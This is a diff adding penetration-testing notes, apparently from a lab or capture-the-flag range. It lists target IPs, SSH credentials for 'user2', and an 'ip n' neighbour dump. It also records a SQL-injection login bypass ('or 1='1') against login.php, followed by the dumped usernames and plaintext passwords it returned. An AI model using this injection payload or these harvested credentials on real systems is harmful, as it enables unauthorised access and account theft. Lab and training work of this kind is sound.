@@ -755,6 +755,46 @@ Rsyslog
 
 * First Targe Ip address: 10.50.35.1
 
+1.) http enum script on webserver.
+2.) XSS on login.html
+
+## ssh credentials:
+system_user=user2
+user_password=EaglesIsARE78
 
 
+user2@PublicFacingWebsite:/$ ip n
+10.10.28.30 dev ens3 lladdr fa:16:3e:f9:39:67 REACHABLE
+
+192.168.28.181 WebApp
+
+
+
+
+
+
+10.50.35.1/login.php?username=Aaron' or 1='1 & passwd=Aaron' or 1='1
+
+Array
+(
+    [0] => user2
+    [name] => user2
+    [1] => RntyrfVfNER78
+    [pass] => RntyrfVfNER78
+)
+1Array
+(
+    [0] => user3
+    [name] => user3
+    [1] => Obo4GURRnccyrf
+    [pass] => Obo4GURRnccyrf
+)
+1Array
+(
+    [0] => Lee_Roth
+    [name] => Lee_Roth
+    [1] => anotherpassword4THEages
+    [pass] => anotherpassword4THEages
+)
+1
 
